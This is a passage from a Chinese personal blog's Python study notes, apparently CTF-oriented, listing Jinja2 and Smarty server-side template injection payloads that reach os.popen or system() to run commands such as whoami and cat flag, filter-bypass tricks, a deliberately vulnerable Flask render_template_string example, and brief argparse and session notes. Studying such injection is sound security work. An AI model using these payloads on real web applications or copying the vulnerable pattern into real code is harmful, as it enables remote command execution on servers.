<h3 id="catch-warning"><a href="#catch-warning" class="headerlink" title="catch warning"></a>catch warning</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">147</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.get(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;tac f*&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="T2-Smarty"><a href="#T2-Smarty" class="headerlink" title="T2 Smarty"></a>T2 Smarty</h3><p>{if system(‘ls &#x2F;‘)}{&#x2F;if}<br>{if system(‘cat &#x2F;flag_13_searchmaster’)}{&#x2F;if}</p>
<h3 id="dict-join"><a href="#dict-join" class="headerlink" title="dict()|join"></a>dict()|join</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(% <span class="built_in">set</span>+args=<span class="built_in">dict</span>(ar=<span class="number">0</span>,gs=<span class="number">1</span>)|join %)</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> aa=<span class="built_in">dict</span>(pop=<span class="number">0</span>,en=<span class="number">1</span>)|join %&#125;&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">161</span>].__init__.__globals__[aa](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;%(lipsum|attr(__globals__))|attr(get)(os)|attr(popen)(cmd)|attr(read)()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request[<span class="string">&#x27;args&#x27;</span>][<span class="string">&#x27;t1&#x27;</span>]]&#125;&#125;&amp;t1=__class__</span><br><span class="line">&#123;%<span class="built_in">set</span> ar=<span class="built_in">dict</span>(ar=a, gs=b)|join%&#125;&#123;%<span class="built_in">set</span> ge=<span class="built_in">dict</span>(g=a, et=b)|join%&#125;&#123;%<span class="built_in">set</span> a=<span class="built_in">dict</span>(a=a)|join%&#125;&#123;%<span class="built_in">print</span> request|attr(ar)|attr(ge)(a)%&#125;&amp;a=qwq</span><br></pre></td></tr></table></figure>
<p>attr(“globals”)[‘’]<br><strong>globals</strong>[‘os’]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%  %&#125;里面相当于写py</span><br></pre></td></tr></table></figure>

<h3 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">161</span>].__init__.__globals__.get(<span class="string">&#x27;__builtins__&#x27;</span>).get(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>原来这些 叫过滤器：**|filter()**</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">attr()  <span class="comment">#获取属性</span></span><br><span class="line">join()  <span class="comment">#合并成字符串</span></span><br><span class="line">FILTERS = &#123;</span><br><span class="line">    <span class="string">&#x27;abs&#x27;</span>:                  <span class="built_in">abs</span>,</span><br><span class="line">    <span class="string">&#x27;attr&#x27;</span>:                 do_attr,</span><br><span class="line">    <span class="string">&#x27;batch&#x27;</span>:                do_batch,</span><br><span class="line">    <span class="string">&#x27;capitalize&#x27;</span>:           do_capitalize,</span><br><span class="line">    <span class="string">&#x27;center&#x27;</span>:               do_center,</span><br><span class="line">    <span class="string">&#x27;count&#x27;</span>:                <span class="built_in">len</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>:                    do_default,</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>:              do_default,</span><br><span class="line">    <span class="string">&#x27;dictsort&#x27;</span>:             do_dictsort,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>:                    escape,</span><br><span class="line">    <span class="string">&#x27;escape&#x27;</span>:               escape,</span><br><span class="line">    <span class="string">&#x27;filesizeformat&#x27;</span>:       do_filesizeformat,</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>:                do_first,</span><br><span class="line">    <span class="string">&#x27;float&#x27;</span>:                do_float,</span><br><span class="line">    <span class="string">&#x27;forceescape&#x27;</span>:          do_forceescape,</span><br><span class="line">    <span class="string">&#x27;format&#x27;</span>:               do_format,</span><br><span class="line">    <span class="string">&#x27;groupby&#x27;</span>:              do_groupby,</span><br><span class="line">    <span class="string">&#x27;indent&#x27;</span>:               do_indent,</span><br><span class="line">    <span class="string">&#x27;int&#x27;</span>:                  do_int,</span><br><span class="line">    <span class="string">&#x27;join&#x27;</span>:                 do_join,</span><br><span class="line">    <span class="string">&#x27;last&#x27;</span>:                 do_last,</span><br><span class="line">    <span class="string">&#x27;length&#x27;</span>:               <span class="built_in">len</span>,</span><br><span class="line">    <span class="string">&#x27;list&#x27;</span>:                 do_list,</span><br><span class="line">    <span class="string">&#x27;lower&#x27;</span>:                do_lower,</span><br><span class="line">    <span class="string">&#x27;map&#x27;</span>:                  do_map,</span><br><span class="line">    <span class="string">&#x27;pprint&#x27;</span>:               do_pprint,</span><br><span class="line">    <span class="string">&#x27;random&#x27;</span>:               do_random,</span><br><span class="line">    <span class="string">&#x27;reject&#x27;</span>:               do_reject,</span><br><span class="line">    <span class="string">&#x27;rejectattr&#x27;</span>:           do_rejectattr,</span><br><span class="line">    <span class="string">&#x27;replace&#x27;</span>:              do_replace,</span><br><span class="line">    <span class="string">&#x27;reverse&#x27;</span>:              do_reverse,</span><br><span class="line">    <span class="string">&#x27;round&#x27;</span>:                do_round,</span><br><span class="line">    <span class="string">&#x27;safe&#x27;</span>:                 do_mark_safe,</span><br><span class="line">    <span class="string">&#x27;select&#x27;</span>:               do_select,</span><br><span class="line">    <span class="string">&#x27;selectattr&#x27;</span>:           do_selectattr,</span><br><span class="line">    <span class="string">&#x27;slice&#x27;</span>:                do_slice,</span><br><span class="line">    <span class="string">&#x27;sort&#x27;</span>:                 do_sort,</span><br><span class="line">    <span class="string">&#x27;string&#x27;</span>:               soft_unicode,</span><br><span class="line">    <span class="string">&#x27;striptags&#x27;</span>:            do_striptags,</span><br><span class="line">    <span class="string">&#x27;sum&#x27;</span>:                  do_sum,</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>:                do_title,</span><br><span class="line">    <span class="string">&#x27;trim&#x27;</span>:                 do_trim,</span><br><span class="line">    <span class="string">&#x27;truncate&#x27;</span>:             do_truncate,</span><br><span class="line">    <span class="string">&#x27;upper&#x27;</span>:                do_upper,</span><br><span class="line">    <span class="string">&#x27;urlencode&#x27;</span>:            do_urlencode,</span><br><span class="line">    <span class="string">&#x27;urlize&#x27;</span>:               do_urlize,</span><br><span class="line">    <span class="string">&#x27;wordcount&#x27;</span>:            do_wordcount,</span><br><span class="line">    <span class="string">&#x27;wordwrap&#x27;</span>:             do_wordwrap,</span><br><span class="line">    <span class="string">&#x27;xmlattr&#x27;</span>:              do_xmlattr,</span><br><span class="line">    <span class="string">&#x27;tojson&#x27;</span>:               do_tojson,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><h3 id="经典jinjia2漏洞ssti"><a href="#经典jinjia2漏洞ssti" class="headerlink" title="经典jinjia2漏洞ssti"></a>经典jinjia2漏洞ssti</h3><p>先看看 <strong>render_template</strong></p>
<p>app.py</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    request,</span><br><span class="line">    render_template,</span><br><span class="line">)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        name = request.args.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>app&#x2F;templates&#x2F;index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>apptest<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jinjia2会解析 **&#123;&#123;&#125;&#125;** 里面的变量</span><br></pre></td></tr></table></figure>
<p>现在看看 <strong>render_template_string</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    request,</span><br><span class="line">    render_template_string,</span><br><span class="line">)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        name = request.args.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;</span> % name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如此在 **name** 中添加&#123;&#123;&#125;&#125; 就会造成ssti漏洞</span><br></pre></td></tr></table></figure>
<h3 id="argparse"><a href="#argparse" class="headerlink" title="argparse"></a>argparse</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mg1507/article/details/124468327?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171176450616800186562017%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171176450616800186562017&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124468327-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=argparse&spm=1018.2226.3001.4187">argparse</a></p>
<p>这个博主讲的不错</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"> </span><br><span class="line">aap = argparse.ArgumentParser(description = <span class="string">&quot;parse arguement of XXXX&quot;</span>)</span><br><span class="line">aap.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--input&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">aap.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--type&#x27;</span>, choices=[<span class="string">&#x27;de&#x27;</span>,<span class="string">&#x27;en&#x27;</span>])</span><br><span class="line">aap.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--other&#x27;</span>, default=<span class="string">&#x27;str&#x27;</span>, choices=[<span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>])</span><br><span class="line">parse_argument = aap.parse_args()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> parse_argument.<span class="built_in">input</span> != <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(parse_argument.<span class="built_in">input</span>)</span><br><span class="line">    <span class="built_in">print</span>(parse_argument.<span class="built_in">type</span>)       </span><br><span class="line">    <span class="built_in">print</span>(parse_argument.other)           </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*** User Help Info ***&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python test.py -i asdfvbngfds -t de</span><br><span class="line"></span><br><span class="line"><span class="comment"># asdfvbngfds</span></span><br><span class="line"><span class="comment"># de</span></span><br><span class="line"><span class="comment"># str</span></span><br></pre></td></tr></table></figure>

<p>大概也能看懂</p>
<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;St3ong_s3cre4_ke7&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        name = session[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> name != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;你是谁&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>]=<span class="string">&quot;XiLitter&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;session重新设置&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>,port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>


<p><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">session伪造</a></p>
<p>相同的 内容 session也不一样</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">arkcimi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/Python/">http://example.com/Python/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">arkcimi's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/ssti/">ssti</a><a class="post-meta__tags" href="/tags/flask/">flask</a></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">php伪协议</div></div></a></div><div class="next-post pull-right"><a href="/kali/" title="kali"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">kali</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">arkcimi</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/arkcimi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python"><span class="toc-number">1.</span> <span class="toc-text">Python</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84"><span class="toc-number">1.1.</span> <span class="toc-text">数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#str"><span class="toc-number">1.2.</span> <span class="toc-text">str</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#os"><span class="toc-number">1.3.</span> <span class="toc-text">os</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%AC%E8%99%AB"><span class="toc-number">1.4.</span> <span class="toc-text">爬虫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.5.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class-bases-subclasses-chain"><span class="toc-number">1.5.1.</span> <span class="toc-text">class-bases-subclasses chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#import"><span class="toc-number">1.5.2.</span> <span class="toc-text">import</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#catch-warning"><span class="toc-number">1.5.3.</span> <span class="toc-text">catch warning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#T1"><span class="toc-number">1.5.4.</span> <span class="toc-text">T1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#T2-Smarty"><span class="toc-number">1.5.5.</span> <span class="toc-text">T2 Smarty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict-join"><span class="toc-number">1.5.6.</span> <span class="toc-text">dict()|join</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins"><span class="toc-number">1.5.7.</span> <span class="toc-text">builtins</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter"><span class="toc-number">1.5.8.</span> <span class="toc-text">filter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask"><span class="toc-number">1.6.</span> <span class="toc-text">flask</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8jinjia2%E6%BC%8F%E6%B4%9Essti"><span class="toc-number">1.6.1.</span> <span class="toc-text">经典jinjia2漏洞ssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#argparse"><span class="toc-number">1.6.2.</span> <span class="toc-text">argparse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session"><span class="toc-number">1.6.3.</span> <span class="toc-text">session</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/xxe/" title="xxe">xxe</a><time datetime="2024-05-21T01:48:16.000Z" title="发表于 2024-05-21 09:48:16">2024-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/hash/" title="hash">hash</a><time datetime="2024-05-21T01:47:52.000Z" title="发表于 2024-05-21 09:47:52">2024-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/JAVAunserialize/" title="JAVAunserialize">JAVAunserialize</a><time datetime="2024-05-21T01:46:48.000Z" title="发表于 2024-05-21 09:46:48">2024-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/make/" title="make">make</a><time datetime="2024-04-13T03:07:52.000Z" title="发表于 2024-04-13 11:07:52">2024-04-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/websocket/" title="websocket">websocket</a><time datetime="2024-04-09T10:19:36.000Z" title="发表于 2024-04-09 18:19:36">2024-04-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By arkcimi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>